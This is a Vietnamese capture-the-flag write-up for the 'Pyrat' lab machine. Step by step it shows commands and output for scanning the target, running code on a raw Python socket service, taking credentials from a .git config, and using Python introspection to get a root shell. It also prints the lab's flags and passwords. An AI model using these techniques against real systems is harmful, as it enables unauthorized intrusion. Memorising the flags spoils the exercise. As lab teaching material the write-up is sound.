# Pyrat

## Pyrat  <a href="#user-content-pyrat-v11-huong-dan-giai-chi-tiet" id="user-content-pyrat-v11-huong-dan-giai-chi-tiet"></a>

### Tóm tắt chuỗi khai thác (Exploit Chain Overview) <a href="#user-content-tom-tat-chuoi-khai-thac-exploit-chain-overview" id="user-content-tom-tat-chuoi-khai-thac-exploit-chain-overview"></a>

<figure><img src="../.gitbook/assets/image (676).png" alt=""><figcaption></figcaption></figure>

### 1. Thu thập thông tin (Reconnaissance) <a href="#user-content-1-thu-thap-thong-tin-reconnaissance" id="user-content-1-thu-thap-thong-tin-reconnaissance"></a>

Đầu tiên, tôi thực hiện quét các cổng mở trên máy mục tiêu để xác định các dịch vụ đang chạy.

**Lệnh:**

```
nmap -sC -sV -oN nmap_initial.txt 10.48.144.41
```

**Kết quả:**

```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-16 10:32 ESTNmap scan report for 10.48.144.41Host is up (0.0012s latency).Not shown: 998 closed tcp ports (reset)PORT     STATE SERVICE  VERSION22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Tôi thấy hai cổng mở: 22 (SSH) và 8000 (HTTP). Tôi thử truy cập cổng 8000 bằng `curl`.

**Lệnh:**

```
curl -v http://10.48.144.41:8000
```

**Kết quả:**

```
*   Trying 10.48.144.41:8000...* Connected to 10.48.144.41 (10.48.144.41) port 8000> GET / HTTP/1.1> Host: 10.48.144.41:8000> User-Agent: curl/8.17.0> Accept: */*> * HTTP 1.0, assume close after body< HTTP/1.0 200 OK< Server: SimpleHTTP/0.6 Python/3.11.2< Date: Fri Jan 16 15:32:51 2026< Content-type: text/html; charset=utf-8< Content-Length: 27< Try a more basic connection
```

Phản hồi "Try a more basic connection" gợi ý rằng đây không phải là một web server thông thường phục vụ HTML, mà có thể là một socket server dạng raw đang lắng nghe.

### 2. Truy cập ban đầu (Initial Access) <a href="#user-content-2-truy-cap-ban-dau-initial-access" id="user-content-2-truy-cap-ban-dau-initial-access"></a>

Dựa trên gợi ý "basic connection", tôi sử dụng `nc` (Netcat) để kết nối trực tiếp đến cổng 8000.

**Lệnh:**

```
nc 10.48.144.41 8000
```

Sau khi kết nối, tôi thử nhập một biểu thức toán học Python đơn giản để xem liệu server có thực thi mã hay không.

**Input:**

```
print(1+1)
```

**Output:**

```
2
```

Server trả về kết quả là `2`, xác nhận rằng server đang nhận đầu vào và thực thi nó thông qua hàm `exec()` hoặc `eval()` của Python. Đây là lỗ hổng Remote Code Execution.

Tiếp theo, tôi thử liệt kê các file trong thư mục hiện tại và kiểm tra người dùng đang chạy dịch vụ.

**Input:**

```
import osprint(os.listdir('.'))print(os.popen('id').read())
```

**Output:**

```
[Errno 13] Permission denied: '.'uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Tôi đang chạy dưới quyền `www-data` và không có quyền liệt kê thư mục hiện tại. Tuy nhiên, tôi có thể thực thi các lệnh hệ thống.

### 3. Leo thang đặc quyền User <a href="#user-content-3-leo-thang-dac-quyen-user" id="user-content-3-leo-thang-dac-quyen-user"></a>

Tôi tiến hành liệt kê (enumerate) hệ thống tập tin để tìm kiếm các thông tin nhạy cảm. "Well-known folder" trong mô tả bài thường ám chỉ các thư mục như `.git` hoặc thư mục backup.

Tôi tìm kiếm các thư mục `.git` trên toàn hệ thống.

**Input:**

```
print(os.popen('find / -maxdepth 3 -name ".git" 2>/dev/null').read())
```

**Output:**

```
/opt/dev/.git
```

Tôi tìm thấy một git repository tại `/opt/dev/.git`. Tôi kiểm tra file cấu hình của git để xem có lưu trữ thông tin xác thực nào không.

**Input:**

```
print(os.popen('cat /opt/dev/.git/config').read())
```

**Output:**

```
[core]        repositoryformatversion = 0        filemode = true        bare = false        logallrefupdates = true[user]        name = Jose Mario        email = josemlwdf@github.com[credential]        helper = cache --timeout=3600[credential "https://github.com"]        username = think        password = _TH1NKINGPirate$_
```

Tôi tìm thấy thông tin đăng nhập:

* Username: `think`
* Password: `_TH1NKINGPirate$_`

Tôi sử dụng thông tin này để đăng nhập SSH.

**Lệnh:**

```
ssh -o StrictHostKeyChecking=no think@10.48.144.41
```

> **Giải thích lệnh SSH:** `ssh -o StrictHostKeyChecking=no` được sử dụng để tự động chấp nhận "fingerprint" của máy chủ mà không cần hỏi xác nhận (Yes/No).
>
> * Trong CTF, các máy ảo thường được reset và sinh lại key mới liên tục. Nếu không có tùy chọn này, SSH sẽ cảnh báo "Remote host identification has changed" và chặn kết nối để bảo mật.
> * Tùy chọn này giúp tiết kiệm thời gian gõ "yes" và tránh lỗi khi chạy script tự động.
> * **Lưu ý:** Chỉ nên dùng trong môi trường CTF/Lab an toàn. Trong thực tế, điều này làm tăng nguy cơ tấn công Man-in-the-Middle.

Sau khi nhập mật khẩu `_TH1NKINGPirate$_`, tôi đăng nhập thành công.

**Lấy User Flag:**

```
think@ip-10-48-144-41:~$ cat user.txt996bdb1f619a68361417cabca5454705
```

### 4. Leo thang đặc quyền Root <a href="#user-content-4-leo-thang-dac-quyen-root" id="user-content-4-leo-thang-dac-quyen-root"></a>

Sau khi có quyền user local, tôi tiếp tục điều tra thư mục `/opt/dev` mà tôi đã tìm thấy trước đó.

**Lệnh:**

```
cd /opt/devls -lagit log --oneline
```

Tôi thấy file `pyrat.py`. Tôi kiểm tra lịch sử git và file cũ `pyrat.py.old`.

**Lệnh:**

```
git show HEAD:pyrat.py.old
```

Nội dung file cho thấy một số logic xử lý kết nối:

```
def switch_case(client_socket, data):    if data == 'some_endpoint':        get_this_enpoint(client_socket)    else:        # Check socket is admin and downgrade if is not aprooved        uid = os.getuid()        if (uid == 0):            change_uid()        if data == 'shell':            shell(client_socket)        else:            exec_python(client_socket, data)
```

Mã nguồn cho thấy có một logic kiểm tra `uid`. Nếu `uid == 0` (root), nó sẽ hạ quyền (`change_uid()`) TRỪ KHI dữ liệu gửi lên khớp với một endpoint đặc biệt nào đó (trong mã cũ là `some_endpoint`, nhưng tôi cần tìm giá trị thực tế trong phiên bản đang chạy).

Vì tôi vẫn có thể kết nối đến cổng 8000 và thực thi mã Python, tôi có thể sử dụng tính năng "introspection" của Python để xem mã nguồn hoặc các biến của tiến trình đang chạy (`pyrat.py`) mà không cần quyền đọc file root.

Tôi kết nối lại Netcat đến cổng 8000 và kiểm tra các hằng số (constants) và tên (names) được sử dụng trong hàm `switch_case`.

**Lệnh:**

```
nc 10.48.144.41 8000
```

**Input:**

```
print(switch_case.__code__.co_consts)
```

**Output:**

```
(None, 'admin', 0, 'shell')
```

Tôi thấy chuỗi `'admin'`. Điều này gợi ý rằng `some_endpoint` trong mã cũ đã được đổi thành `'admin'`. Nếu tôi gửi chuỗi `'admin'`, chương trình sẽ gọi hàm `get_admin` (tên hàm tôi đoán dựa trên `co_names`).

Tôi kiểm tra tiếp hàm `get_admin` để xem nó yêu cầu gì (mật khẩu).

**Input:**

```
print(get_admin.__code__.co_consts)
```

**Output:**

```
(None, 0, 'Start a fresh client to begin.', 'abc123', 3, 'Password:', 1024, 'utf-8', 'Welcome Admin!!! Type "shell" to begin')
```

Tôi thấy chuỗi `'abc123'`. Đây rất có thể là mật khẩu.

**Quy trình khai thác leo thang:**

1. Kết nối lại vào cổng 8000 (để có session mới).
2. Gửi chuỗi `admin` để vào nhánh admin (tránh bị hạ quyền `change_uid()`).
3. Nhập mật khẩu `abc123`.
4. Sau khi đăng nhập thành công với quyền admin, gửi lệnh `shell`. Vì tôi đã bypass được bước hạ quyền, và tiến trình `pyrat.py` gốc chạy dưới quyền root, shell được sinh ra (`pty.spawn("/bin/sh")`) sẽ có quyền root.

**Thực hiện:**

**Lệnh:**

```
nc 10.48.144.41 8000
```

**Tương tác:**

```
adminPassword:abc123Welcome Admin!!! Type "shell" to beginshellid
```

**Output:**

```
uid=0(root) gid=0(root) groups=0(root)
```

Tôi đã có quyền root.

**Lấy Root Flag:**

```
cat /root/root.txtba5ed03e9e74bb98054438480165e221
```

### 5. Mẹo và Kỹ thuật hữu ích (Tips & Tricks) <a href="#user-content-5-meo-va-ky-thuat-huu-ich-tips-tricks" id="user-content-5-meo-va-ky-thuat-huu-ich-tips-tricks"></a>

**1. Introspection (Tự soi chiếu mã nguồn Python đang chạy)** Khi khai thác lỗ hổng thực thi mã (RCE) trên Python nhưng không có quyền đọc file mã nguồn trên đĩa, hãy dùng các tính năng có sẵn của Python để trích xuất thông tin từ bộ nhớ:

* `dir()`: Liệt kê danh sách các biến, hàm đang tồn tại trong namespace hiện tại.
* `switch_case.__code__.co_consts`: Xem danh sách các hằng số (chuỗi, số) được định nghĩa cứng (hardcoded) trong hàm. Rất hữu ích để tìm mật khẩu hoặc tên endpoint ẩn.
* `switch_case.__code__.co_names`: Xem danh sách các tên biến hoặc hàm được gọi bên trong hàm mục tiêu. Giúp đoán luồng logic.

**2. Khai thác thông tin từ .git** Thư mục `.git` là kho báu cho pentester. Nếu tìm thấy nó:

* Luôn kiểm tra file `.git/config` đầu tiên, rất nhiều developer để quên thông tin đăng nhập ở đây.
* Sử dụng `git log` và `git show` để xem lại các phiên bản mã nguồn cũ. Các lỗi bảo mật hoặc endpoint ẩn thường nằm trong các đoạn code đã bị xóa hoặc sửa đổi nhưng vẫn còn lưu trong lịch sử git.

**3. Raw Socket vs HTTP Client** Nếu `curl`, `wget` hoặc trình duyệt web không kết nối được hoặc trả về lỗi lạ, hãy thử dùng `nc` (Netcat). Nhiều challenge CTF sử dụng python socket thô (`socket.socket`) thay vì thư viện HTTP chuẩn, nên các header gửi bởi client HTTP thông thường có thể làm crash hoặc sai lệch xử lý của server.

**4. Ổn định Shell (Upgrading Shell)** Khi nhận được reverse shell đơn giản (sh), thường sẽ bị hạn chế (không dùng được mũi tên, không có tab autocomplete). Nâng cấp lên TTY shell đầy đủ bằng lệnh:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Lệnh này giả lập một terminal đầy đủ, cho phép chạy các lệnh yêu cầu tương tác như `su`, `sudo` hoặc trình soạn thảo văn bản.

**5. SSH Option: -o StrictHostKeyChecking=no**

* `-o`: Dùng để truyền một option cấu hình vào lệnh SSH.
* `StrictHostKeyChecking=no`: Tắt tính năng kiểm tra khóa máy chủ (host key) nghiêm ngặt.
* **Tại sao dùng?**: Mặc định, SSH sẽ yêu cầu bạn xác nhận (gõ "yes") khi kết nối đến một server lạ lần đầu. Nếu server IP này trước đó đã có key khác, SSH sẽ cảnh báo lỗi (Man-in-the-middle attack detected) và chặn kết nối. Trong môi trường CTF, các máy ảo thường dùng chung IP hoặc reset liên tục, nên việc tắt kiểm tra này giúp kết nối nhanh gọn và tránh lỗi không mong muốn.
